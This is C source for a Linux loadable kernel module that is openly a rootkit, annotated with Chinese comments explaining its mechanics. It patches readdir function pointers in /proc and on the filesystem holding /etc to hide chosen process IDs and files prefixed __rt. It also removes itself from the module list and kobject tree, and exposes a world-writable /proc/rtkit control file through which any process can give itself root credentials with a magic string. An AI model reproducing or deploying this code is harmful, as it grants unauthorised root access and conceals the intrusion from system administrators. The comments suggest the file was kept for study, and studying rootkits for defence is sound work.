#include <linux/init.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/string.h>
#include <linux/cred.h>
#include <linux/fs.h>

#define MIN(a,b) \
   ({ typeof (a) _a = (a); \
      typeof (b) _b = (b); \
     _a < _b ? _a : _b; })


#define MAX_PIDS 50

MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("Arkadiusz Hiler<ivyl@sigillum.cc>");
MODULE_AUTHOR("Michal Winiarski<t3hkn0r@gmail.com>");

//STATIC VARIABLES SECTION
//we don't want to have it visible in kallsyms and have access to it all the time
static struct proc_dir_entry *proc_root;
static struct proc_dir_entry *proc_rtkit;

static int (*proc_readdir_orig)(struct file *, void *, filldir_t);
static int (*fs_readdir_orig)(struct file *, void *, filldir_t);

static filldir_t proc_filldir_orig;
static filldir_t fs_filldir_orig;

static struct file_operations *proc_fops;
static struct file_operations *fs_fops;

static struct list_head *module_previous;
static struct list_head *module_kobj_previous;

static char pids_to_hide[MAX_PIDS][8];
static int current_pid = 0;

static char hide_files = 1;

static char module_hidden = 0;

static char module_status[1024];

//MODULE HELPERS
void module_hide(void)
{
//让lsmod，和rmmod无法发现mod
//这里和隐藏/proc/rtkit这个目录不一样
//链表删除操作
	if (module_hidden) return;
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);
	module_hidden = !module_hidden;
}
 
void module_show(void)
{
	int result;
	if (!module_hidden) return;
	list_add(&THIS_MODULE->list, module_previous);
	result = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "rt");
	module_hidden = !module_hidden;
}

//PAGE RW HELPERS
static void set_addr_rw(void *addr)
{
	unsigned int level;
	pte_t *pte = lookup_address((unsigned long) addr, &level);
	//找到地址的属性地址，改变页属性
	if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
}

static void set_addr_ro(void *addr)
{
	unsigned int level;
	pte_t *pte = lookup_address((unsigned long) addr, &level);
	pte->pte = pte->pte &~_PAGE_RW;
}

//CALLBACK SECTION
static int proc_filldir_new(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
{
	int i;
	for (i=0; i < current_pid; i++) {
		if (!strcmp(name, pids_to_hide[i])) return 0;
	}
	if (!strcmp(name, "rtkit")) return 0;
	//在这里执行过滤
	return proc_filldir_orig(buf, name, namelen, offset, ino, d_type);
}

static int proc_readdir_new(struct file *filp, void *dirent, filldir_t filldir)
{
//这个函数的功能是把回调函数传给proc_readdir_orig
//在这里我们使用了我们自己的回调函数
	proc_filldir_orig = filldir;
	return proc_readdir_orig(filp, dirent, proc_filldir_new);
}

static int fs_filldir_new(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
{
	if (hide_files && (!strncmp(name, "__rt", 4) || !strncmp(name, "10-__rt", 7))) return 0;
	//过滤掉__rt开头和10__rt
	return fs_filldir_orig(buf, name, namelen, offset, ino, d_type);
}
//不同的目录可以有不同的readdir，不同的reddir传入同一个回调函数fs_filldir
//如果把fs_filldir替换掉，那么所有目录都被hack
static int fs_readdir_new(struct file *filp, void *dirent, filldir_t filldir)
{
	fs_filldir_orig = filldir;
	return fs_readdir_orig(filp, dirent, fs_filldir_new);
}

static int rtkit_read(char *buffer, char **buffer_location, off_t off, int count, int *eof, void *data)
{
	int size;
	
	sprintf(module_status, 
"RTKIT\n\
DESC:\n\
  hides files prefixed with __rt or 10-__rt and gives root\n\
CMNDS:\n\
  mypenislong - uid and gid 0 for writing process\n\
  hpXXXX - hides proc with id XXXX\n\
  up - unhides last process\n\
  thf - toogles file hiding\n\
  mh - module hide\n\
  ms - module show\n\
STATUS\n\
  fshide: %d\n\
  pids_hidden: %d\n\
  module_hidden: %d\n", hide_files, current_pid, module_hidden);

	size = strlen(module_status);

	if (off >= size) return 0;
  
	if (count >= size-off) {
		memcpy(buffer, module_status+off, size-off);
	} else {
		memcpy(buffer, module_status+off, count);
	}
  
	return size-off;
}

static int rtkit_write(struct file *file, const char __user *buff, unsigned long count, void *data)
{
	if (!strncmp(buff, "mypenislong", MIN(11, count))) { 
		//changes to root
		//对所有用户而言，其程序都是root权限的
		//To alter the current process's credentials
		//也就是说谁执行这个写操作，谁就获取了root权限
		struct cred *credentials = prepare_creds();
		credentials->uid = credentials->euid = 0;
		credentials->gid = credentials->egid = 0;
		commit_creds(credentials);
	} else if (!strncmp(buff, "hp", MIN(2, count))) {//upXXXXXX hides process with given id
		if (current_pid < MAX_PIDS) strncpy(pids_to_hide[current_pid++], buff+2, MIN(7, count-2));
	} else if (!strncmp(buff, "up", MIN(2, count))) {//unhides last hidden process
		if (current_pid > 0) current_pid--;
	} else if (!strncmp(buff, "thf", MIN(3, count))) {//toggles hide files in fs
		hide_files = !hide_files;
	} else if (!strncmp(buff, "mh", MIN(2, count))) {//module hide
		module_hide();
	} else if (!strncmp(buff, "ms", MIN(2, count))) {//module hide
		module_show();
	}
	
        return count;
}

//INITIALIZING/CLEANING HELPER METHODS SECTION
static void procfs_clean(void)
{
	if (proc_rtkit != NULL) {
		remove_proc_entry("rtkit", NULL);
		proc_rtkit = NULL;
	}
	if (proc_fops != NULL && proc_readdir_orig != NULL) {
		set_addr_rw(proc_fops);
		proc_fops->readdir = proc_readdir_orig;
		set_addr_ro(proc_fops);
	}
}
	
static void fs_clean(void)
{
	if (fs_fops != NULL && fs_readdir_orig != NULL) {
		set_addr_rw(fs_fops);
		fs_fops->readdir = fs_readdir_orig;
		set_addr_ro(fs_fops);
	}
}

static int __init procfs_init(void)
{
	//new entry in proc root with 666 rights
	proc_rtkit = create_proc_entry("rtkit", 0666, NULL);
	//create_proc_entry 在 /proc 文件系统中创建一个虚拟文件
	if (proc_rtkit == NULL) return 0;
	proc_root = proc_rtkit->parent;
	if (proc_root == NULL || strcmp(proc_root->name, "/proc") != 0) {
		return 0;
	}
	//查看是否真在/proc目录下
	proc_rtkit->read_proc = rtkit_read;
	//重定向读函数
	proc_rtkit->write_proc = rtkit_write;
	
	//substitute proc readdir to our wersion (using page mode change)
	proc_fops = ((struct file_operations *) proc_root->proc_fops);
	proc_readdir_orig = proc_fops->readdir;
	//修改读目录这个函数
	set_addr_rw(proc_fops);
	//使这个指针可写
	proc_fops->readdir = proc_readdir_new;
	set_addr_ro(proc_fops);
	
	return 1;
}

static int __init fs_init(void)
{
	struct file *etc_filp;
	
	//get file_operations of /etc
	//对/etc这个目录下的操作进行hack
	etc_filp = filp_open("/etc", O_RDONLY, 0);
	//该函数返回strcut file*结构指针
	if (etc_filp == NULL) return 0;
	
	fs_fops = (struct file_operations *) etc_filp->f_op;
	//vfs结构，里面包含了各种文件操作函数的指针
	filp_close(etc_filp, NULL);
	
	//substitute readdir of fs on which /etc is
	fs_readdir_orig = fs_fops->readdir;
	set_addr_rw(fs_fops);
	fs_fops->readdir = fs_readdir_new;
	//修改读普通文件目录这个函数
	set_addr_ro(fs_fops);
	
	return 1;
}


//MODULE INIT/EXIT
static int __init rootkit_init(void)
{
	if (!procfs_init() || !fs_init()) {
		//只要任意一个不成功，clean
		procfs_clean();
		fs_clean();
		return 1;
	}
	module_hide();
	
	return 0;
}

static void __exit rootkit_exit(void)
{
	procfs_clean();
	fs_clean();
}

module_init(rootkit_init);
module_exit(rootkit_exit);
